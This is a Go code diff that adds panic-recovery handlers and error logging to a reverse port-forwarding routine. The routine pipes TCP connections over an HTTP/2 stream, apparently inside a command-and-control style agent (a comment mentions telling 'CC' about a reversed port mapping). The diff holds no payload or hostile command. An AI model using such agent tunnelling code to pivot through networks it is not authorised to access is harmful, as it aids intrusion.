@@ -173,6 +173,11 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 
 	// serve a TCP connection received on agent side
 	serveConn := func(conn net.Conn) {
+		defer func() {
+			if r := recover(); r != nil {
+				logging.Errorf("serveConn panic: %v", r)
+			}
+		}()
 		// tell CC this is a reversed port mapping
 		lport := strings.Split(conn.RemoteAddr().String(), ":")[1]
 		shID := fmt.Sprintf("%s_%s-reverse", sessionID, lport)
@@ -198,12 +203,22 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 
 		// iocopy
 		go func() {
+			defer func() {
+				if r := recover(); r != nil {
+					logging.Errorf("h2 -> conn pipe panic: %v", r)
+				}
+			}()
 			_, err = io.Copy(conn, h2)
 			if err != nil {
 				logging.Infof("h2 -> conn: %v", err)
 			}
 		}()
 		go func() {
+			defer func() {
+				if r := recover(); r != nil {
+					logging.Errorf("conn -> h2 pipe panic: %v", r)
+				}
+			}()
 			_, err = io.Copy(h2, conn)
 			if err != nil {
 				logging.Infof("conn -> h2: %v", err)
